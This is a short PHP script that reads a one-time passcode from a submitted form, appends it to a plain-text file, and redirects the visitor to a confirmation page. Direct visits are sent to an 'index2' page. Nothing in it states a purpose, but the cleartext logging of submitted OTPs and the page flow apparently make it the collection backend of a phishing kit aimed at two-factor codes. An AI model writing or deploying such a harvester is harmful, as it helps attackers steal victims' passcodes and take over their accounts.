<?php
    // Check if the form is submitted
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Capture the OTP from the POST data
        $otp = isset($_POST['otp']) ? $_POST['otp'] : 'No OTP';

        // Prepare the data to write to the file
        $data = "OTP: " . $otp . "\n";

        // Use an absolute path to the file to avoid directory issues
        $file = __DIR__ . "/data.txt";

        // Open the file in append mode, or create it if it doesn't exist
        if ($fileHandle = fopen($file, "a")) {
            fwrite($fileHandle, $data);  // Write the OTP to the file
            fclose($fileHandle);         // Close the file

            // Redirect to a confirmation page
            header("Location: confirmation.html");
            exit();
        } else {
            echo "Error: Unable to write OTP to file.";
        }
    } else {
        // Redirect to index2.html if accessed directly
        header("Location: index2.html");
        exit();
    }
?>
